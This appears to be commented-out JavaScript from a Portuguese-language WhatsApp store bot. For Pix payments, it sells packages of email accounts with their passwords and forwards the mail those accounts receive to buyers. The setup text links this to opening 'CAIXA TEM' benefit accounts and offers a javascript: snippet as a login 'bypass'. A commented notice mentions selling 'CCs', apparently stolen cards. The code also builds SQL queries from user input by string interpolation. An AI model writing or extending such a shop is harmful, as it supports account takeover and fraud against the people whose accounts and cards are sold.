        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳





        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("📧 EMAILs TERRA") > -1) {

        //             Email_Recebedor = await DataBase_Better.prepare(`SELECT EMAIL_RECEBEDOR FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()
        //             Email_Recebedor = Email_Recebedor["EMAIL_RECEBEDOR"]

        //             if (Email_Recebedor === "1") {

        //                 Texto = `*Defina um endereço de e-mail para receber e-mails _CAIXA_ 📩 utilizando o comando:*

        // /definirEmail===MeuEmail@gmail.com

        // De preferência um e-mail que você utilizará na sua
        // *instância*💻 ou *celular*📲 
        // que você irá abrir a conta do *CAIXA TEM*,

        // Pois todos e-mails da caixa que chegarem para algum e-mail que você adquirir
        // chegará nesse e-mail que você definir.

        // *_Não se preocupe pode alterar isso quando quiser digitando esse mesmo comando._*

        // *Caso não queira definir algum e-mail de destino,*
        // *Envie o comando a seguir:*

        // /definirEmail===0

        // _Independentemente da sua escolha eu ainda vou enviar os e-mails *CAIXA* aqui no seu chat !_

        // *Se você quiser enviar algum e-mail como ex: burla 2 horas para um e-mail especifico.*
        // *Basta digitar:*
        // /enviarEmail===SeuEmail@gmail.com===javascript: document.getElementById('kc-cancel').setAttribute('name', '');`

        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return

        //             }

        //             Categorias = await DataBase_Better.prepare(`SELECT * FROM EMAIL`).all();
        //             if (Categorias.length === 0) {

        //                 Texto = `*INFELIZMENTE ESTAMOS SEM ESTOQUE DE EMAILs NO MOMENTO.*`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 for await (adm of Adms) {
        //                     Texto = `⚠️ *ATENÇÃO ADM* ⚠️

        // Usuário: wa.me/${Numero}

        // Tentou efetuar a compra de EMAIL, mas o estoque está vazio!`
        //                     await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });
        //                 }
        //                 return
        //             }

        //             Array_PACOTE = await DataBase_Better.prepare(`SELECT * FROM PACOTES_EMAIL`).all();

        //             Array_Botoes = []
        //             for await (PACOTE of Array_PACOTE) {
        //                 //console.log(PACOTE["PROVEDOR"])
        //                 //console.log(PACOTE["QUANTIDADE"])
        //                 //console.log(PACOTE["VALOR"])
        //                 try {
        //                     Array_Botoes.push({
        //                         rowId: `${iD_Footer.toString()}|`,
        //                         title: `Quantidade: ${PACOTE["QUANTIDADE"]} EMAILs TERRA`,
        //                         description: `📧 PREÇO: R$: ${PACOTE["VALOR"]}💰`
        //                     })
        //                 } catch (error) {
        //                     await Menu(client, Numero, Mensagem_From)
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }
        //             }

        //             iD_Footer = Date.now()
        //             Texto = `📦 *PACOTES DE EMAILS* 📦

        // Clique em *OPÇÕES DE PACOTES* e escolha o pacote desejado e ao selecionar e enviar, caso você possua saldo suficiente, você estará efetuando a compra do mesmo.

        // ⚠️*MUITA ATENÇÃO AO ESCOLHER UM DOS PACOTES!*⚠️`

        //             await client.sendListMessage(Mensagem_From, {
        //                 buttonText: 'OPÇÕES DE PACOTES',
        //                 description: Texto,
        //                 sections: [
        //                     {
        //                         title: "PACOTES EMAILs",
        //                         rows: Array_Botoes
        //                     },
        //                 ],
        //             }).then(async (result) => {
        //                 await DataBase_Better.prepare(`UPDATE CONTATOS SET ID_BOTAO = '${iD_Footer.toString()}|liberar_esta_interacao_se_for_antiga' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.error('Error when sending: ', erro);
        //             })
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("sfdvs📧 vsdfvPREÇO") > -1) {

        //             Div = Mensagem_Texto.split("Quantidade: ")
        //             QUANTIDADE_PACOTE = Div[1].split(" EM")
        //             QUANTIDADE_PACOTE = QUANTIDADE_PACOTE[0]
        //             QUANTIDADE_PACOTE = QUANTIDADE_PACOTE.replace(/[^0-9\.]/igm, '')

        //             Div = Mensagem_Texto.split("R$: ")
        //             VALOR_PACOTE = Div[1].split("💰")
        //             VALOR_PACOTE = VALOR_PACOTE[0]
        //             VALOR_PACOTE = parseFloat(VALOR_PACOTE).toFixed(2)

        //             console.log(`EMAIL QUANTIDADE_PACOTE: ${QUANTIDADE_PACOTE} | VALOR PACOTE: ${VALOR_PACOTE}`)

        //             Estoque = await DataBase_Better.prepare(`SELECT COUNT(*) FROM EMAIL`).get()

        //             console.log(`Estoque = ${(Estoque["COUNT(*)"])} | QUANTIDADE = ${QUANTIDADE_PACOTE}`)

        //             if (parseFloat(QUANTIDADE_PACOTE) > parseFloat(Estoque["COUNT(*)"])) {

        //                 Texto = `⚠️ *Quantidade de EMAIL no estoque é inferior a quantidade escolhida por você!*

        // ⚙️ *NOSSA EQUIPE FOI NOTIFICADA* ⚙️

        // *Em breve o estoque será reabastecido*📦✅`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });

        //                 for await (adm of Adms) {
        //                     Texto = `⚠️*ATENÇÃO ADM*⚠️

        // *USUÁRIO wa.me/${Numero} TENTOU COMPRAR ${QUANTIDADE_PACOTE} EMAILs, MAS SÓ TEM ${Estoque["COUNT(*)"]} NO ESTOQUE.*`
        //                     await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });
        //                 }
        //                 return
        //             }

        //             SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
        //             SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2);

        //             console.log(`SALDO USER: ${SALDO_USUARIO} | VALOR PACOTE: ${VALOR_PACOTE}`)

        //             if (parseFloat(SALDO_USUARIO) < parseFloat(VALOR_PACOTE)) {

        //                 Texto = `⚠️*Você não possui saldo suficiente para comprar este pacote EMAIL.*`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });


        //                 MIN_RECARGA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MIN_RECARGA'`).get()["VALOR"]
        //                 Exemplo_1 = parseInt(MIN_RECARGA)
        //                 Exemplo_2 = parseInt(MIN_RECARGA) + 3
        //                 Exemplo_3 = parseInt(MIN_RECARGA) + 15
        //                 Exemplo_4 = parseInt(MIN_RECARGA) + 47

        //                 Titulo = `💰 PIX AUTOMÁTICO`
        //                 iD_Footer = Date.now()
        //                 Texto = `💰 *PIX AUTOMÁTICO - TUTORIAL*

        // *Para adicionar saldo na store,use o comando /pix, seguido da quantidade desejada.*

        // *A RECARGA MÍNIMA É: R$:${MIN_RECARGA}*

        // *EXEMPLOS:*

        // *Para criar um pagamento de R$:${parseFloat(Exemplo_1).toFixed(2)}*
        // /pix ${Exemplo_1}

        // *Para criar um pagamento de R$:${parseFloat(Exemplo_2).toFixed(2)}*
        // /pix ${Exemplo_2}

        // *Para criar um pagamento de R$:${parseFloat(Exemplo_3).toFixed(2)}*
        // /pix ${Exemplo_3}

        // *Para criar um pagamento de R$:${parseFloat(Exemplo_4).toFixed(2)}*
        // /pix ${Exemplo_4}


        // *VOCÊ PODE RECARREGAR O QUANTO QUISER A CIMA DE R$:${MIN_RECARGA}, SÓ TROCAR O VALOR DO COMANDO...*

        // Após o envio do comando, será gerado um código pix "Copia e Cola", para qual você irá efetuar o pagamento utilizando o aplicativo do seu banco de preferência, na sessão: Pix > Copia e Cola
        // `

        //                 await client.sendListMessage(Mensagem_From, {
        //                     buttonText: 'OPÇÕES',
        //                     description: Texto,
        //                     sections: [
        //                         {
        //                             title: "OPÇÕES",
        //                             rows: [
        //                                 {
        //                                     rowId: `${iD_Footer.toString()}|`,
        //                                     title: "🔙 MENU",
        //                                     description: "Menu incial.",
        //                                 }
        //                             ]
        //                         },
        //                     ],
        //                 }).then(async (result) => {
        //                     await DataBase_Better.prepare(`UPDATE CONTATOS SET ID_BOTAO = '${iD_Footer.toString()}|0' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine(erro));
        //                     console.log(debugLine("Erro = " + (JSON.stringify(erro))));
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 })
        //                 return
        //             }

        //             NOVO_SALDO = parseFloat(SALDO_USUARIO) - parseFloat(VALOR_PACOTE)
        //             NOVO_SALDO = parseFloat(NOVO_SALDO).toFixed(2);
        //             await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO = '${NOVO_SALDO}' WHERE ID_CONTATO = '${Mensagem_From}'`).run()

        //             Texto_Usuario = `📦 *PACOTE EMAIL COMPRADO!*

        // 🔸 *TIPO:* TERRA
        // 📦 *TOTAL:* ${QUANTIDADE_PACOTE}
        // 💰 *VALOR PACOTE: R$:* ${VALOR_PACOTE}

        // *Qualquer Email que chegar em seus E-mails comprados, você irá receber o conteúdo do mesmo.*
        // `
        //             Item_Fila_Sendo_Processado_MS = Date.now()
        //             await client.sendImage(Mensagem_From, Comprou_PCT_CPF_PV, 'foto', Texto_Usuario).then(async (result) => {
        //                 //console.log('Result: ', result);
        //             }).catch(async(erro) => {
        //                 console.error('Error when sending: ', erro);
        //             });

        //             Array_MATERIAL = await DataBase_Better.prepare(`SELECT * FROM EMAIL`).all();
        //             shuffle(Array_MATERIAL);

        //             Data_Toda = new Date(parseInt(Date.now())).toLocaleString()
        //             Div_Data = Data_Toda.toString().split(" ")

        //             Data_File = Div_Data[0]
        //             Data_File = Data_File.toString().replace(/\//igm, ' ');
        //             Data_File = Data_File.toString().replace(/[^0-9\s]/igm, '');

        //             Hora_File = Div_Data[1]
        //             Hora_File = Hora_File.toString().replace(/\:/igm, ' ');
        //             Hora_File = Hora_File.toString().replace(/[^0-9\s]/igm, '');

        //             Nome_Bot_File = Nome_Bot.toString().replace(/[^a-zA-Z\s]/igm, '');

        //             var Nome_File_Visual = `${QUANTIDADE_PACOTE} EMAIL ${Nome_Bot_File} PARA ${Numero} DATA ${Data_File} HORA ${Hora_File}.txt`
        //             var Nome_File = __dirname + `\\Pacotes\\${Nome_File_Visual}`
        //             Nome_File = Nome_File.replace(/\\/igm, '/');
        //             //console.log(Nome_File)

        //             const message = fs.createWriteStream(Nome_File);

        //             for (let index = 0; index < QUANTIDADE_PACOTE; index++) {

        //                 message.write(`${Array_MATERIAL[index]["EMAIL"]}\n\n`);

        //                 await DataBase_Better.prepare(`INSERT INTO EMAIL_VENDIDOS (EMAIL,SENHA,PROVEDOR,NUMERO_COMPRADOR,VALOR_PACOTE,QUANTIDADE_PACOTE,DATA_MS_INSERIDO) VALUES ('${Array_MATERIAL[index]["EMAIL"]}','${Array_MATERIAL[index]["SENHA"]}','${Array_MATERIAL[index]["PROVEDOR"]}','${Mensagem_From}','${VALOR_PACOTE}','${QUANTIDADE_PACOTE}','${Date.now()}')`).run()
        //                 await DataBase_Better.prepare(`DELETE FROM EMAIL WHERE EMAIL = '${Array_MATERIAL[index]["EMAIL"]}'`).run()

        //                 if (index === parseInt(QUANTIDADE_PACOTE) - 1) {
        //                     console.log("Foi")
        //                     Item_Fila_Sendo_Processado_MS = Date.now()
        //                     await DataBase_Better.prepare(`INSERT INTO PACOTES_EMAIL_VENDIDOS (PROVEDOR,QUANTIDADE,VALOR,NUMERO_COMPRADOR,DATA_INSERIDO_MS) VALUES ('${Array_MATERIAL[index]["PROVEDOR"]}','${QUANTIDADE_PACOTE}','${VALOR_PACOTE}','${Mensagem_From}','${Date.now()}')`).run()

        //                     console.log(fs.existsSync(Nome_File))
        //                     if (fs.existsSync(Nome_File) === false) {
        //                         Item_Fila_Sendo_Processado_MS = Date.now()
        //                         await delay(3000)
        //                     }
        //                     console.log(fs.existsSync(Nome_File))
        //                     if (fs.existsSync(Nome_File) === false) {
        //                         Item_Fila_Sendo_Processado_MS = Date.now()
        //                         await delay(3000)
        //                     }
        //                     console.log(fs.existsSync(Nome_File))
        //                     if (fs.existsSync(Nome_File) === false) {
        //                         Item_Fila_Sendo_Processado_MS = Date.now()
        //                         await delay(3000)
        //                     }
        //                     console.log(fs.existsSync(Nome_File))
        //                     if (fs.existsSync(Nome_File) === false) {
        //                         Item_Fila_Sendo_Processado_MS = Date.now()
        //                         await delay(3000)
        //                     }
        //                     console.log(fs.existsSync(Nome_File))
        //                     if (fs.existsSync(Nome_File) === false) {
        //                         Item_Fila_Sendo_Processado_MS = Date.now()
        //                         await delay(3000)
        //                     }
        //                     console.log(fs.existsSync(Nome_File))
        //                     if (fs.existsSync(Nome_File) === false) {
        //                         Item_Fila_Sendo_Processado_MS = Date.now()
        //                         await delay(3000)
        //                     }

        //                     await client.sendFile(Mensagem_From, Nome_File, Nome_File_Visual, "Texto_Usuario").then(async (result) => {
        //                     }).catch(async(erro) => {
        //                         console.error('Error when sending1: ', erro);
        //                         try {
        //                             //await delay(10000)
        //                             await client.sendFile(Mensagem_From, Nome_File, Nome_File_Visual, "Texto_Usuario").then(async (result) => {
        //                             }).catch(async(erro) => {
        //                                 console.error('Error when sending2: ', erro);
        //                             });
        //                         } catch (error) {
        //                             console.error('Error when sending1: ', erro);
        //                         }
        //                     });
        //                 }
        //             }




        //             /*             if (Notif_Grupo_Comprou_MIX === true) {
        //             Texto_Grupo = `📦 *USUÁRIO COMPROU UM PACOTE MIX* 📦

        //             👤 *USUÁRIO:* wa.me/${Numero}
        //             📦 *COMPROU PACOTE MIX DE* ${QUANTIDADE_PACOTE} *CCs* 

        //             ────────────────

        //             *VENHA ADQUIRIR O MELHOR MATERIAL DA NET!*

        //             *ATENDIMENTO 100% AUTOMÁTICO!*

        //             Este é o número do BOT, mande qualquer mensagem!
        //             wa.me/${NUMERO_PURO_BOT}
        //             `

        //             for await (Grupo of ID_GRUPOS) {
        //             try {
        //             await client.sendImage(Grupo["ID_GRUPO"], Comprou_PCT_CPF_GP, 'foto', Texto_Grupo).then(async (result) => {
        //             }).catch(async(erro) => {
        //             console.error('Error when sending: ', erro);
        //             });
        //             } catch (error) {
        //             }
        //             }
        //             } */

        //             Texto_Adms = `*ADMS: 📦 PACOTE EMAIL COMPRADO*

        // 👤 *NÚMERO DO USUÁRIO:* wa.me/${Numero}
        // 📦 *TOTAL:* ${QUANTIDADE_PACOTE}
        // 💰 *VALOR PCT: R$:* ${VALOR_PACOTE}
        // `
        //             for await (adm of Adms) {
        //                 Texto = Texto_Adms
        //                 await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //             }

        //             Texto = "*Para prosseguir ou consultar os EMAILs comprados, digite qualquer mensagem.*"
        //             await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //             });

        //             console.log(`Pacote EMAIL Comprado Numero: wa.me/${Numero} | Quantidade: ${QUANTIDADE_PACOTE} | Valor: ${VALOR_PACOTE}`)
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳




        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("📘 EMAILs COMPRADOS") > -1) {

        //             item_Array = await DataBase_Better.prepare(`SELECT * FROM EMAIL_VENDIDOS WHERE NUMERO_COMPRADOR = '${Mensagem_From}'`).all();

        //             if (item_Array === undefined) {
        //                 Texto = "Você não comprou nenhum EMAIL ainda!"
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }

        //             iD_Footer = Date.now()

        //             Array_Botoes = []
        //             for await (item of item_Array) {

        //                 Array_Botoes.push({
        //                     rowId: `${iD_Footer.toString()}|`,
        //                     title: `${item["EMAIL"]}`,
        //                     description: `📧 Provedor: ${item["PROVEDOR"]}`
        //                 })
        //             }

        //             Texto = `📘 *EMAILs COMPRADOS* 📘

        // Todos os E-Mails comprados por você.
        // `

        //             await client.sendListMessage(Mensagem_From, {
        //                 buttonText: "EMAILs Comprados",
        //                 description: Texto,
        //                 sections: [
        //                     {
        //                         title: "HISTÓRICO DE EMAILs COMPRADOS",
        //                         rows: Array_Botoes
        //                     },
        //                 ],
        //             }).then(async (result) => {
        //                 await DataBase_Better.prepare(`UPDATE CONTATOS SET ID_BOTAO = '${iD_Footer.toString()}|liberar_esta_interacao_se_for_antiga' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.error('Error when sending: ', erro);
        //             })
        //             return

        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("📧 Provedor: ") > -1) {

        //             Texto_Usuario = `*FIQUE TRANQUILO!*

        // Qualquer E-Mail que chegar em qualquer um dos que você comprou, imediatamente o Bot vai enviar para ti aqui mesmo no seu PV.`

        //             await client.sendText(Mensagem_From, Texto_Usuario).then(async (result) => {
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //             });
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳


        //adicionarEmailAdm===EMAIL:SENHA===NUMERO_COMPRADOR
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        // if (Mensagem_Texto.indexOf("/adicionarEmailAdm===") > -1) {
        //     try {
        //         msg = Mensagem_Texto.split("===")
        //         Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

        //         if (msg[1] === "" || Array_Total_Igual.length != 3) {
        //             Texto = `Comando inválido`
        //             await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //             });
        //             return
        //         }

        //         Conjunto = msg[1].split(":")

        //         await DataBase_Better.prepare(`INSERT INTO EMAIL_VENDIDOS (EMAIL,SENHA,PROVEDOR,NUMERO_COMPRADOR,VALOR_PACOTE,QUANTIDADE_PACOTE,DATA_MS_INSERIDO) VALUES ('${Conjunto[0]}','${Conjunto[1]}','TERRA','${msg[2]}@c.us','0','0','${Date.now()}')`).run()

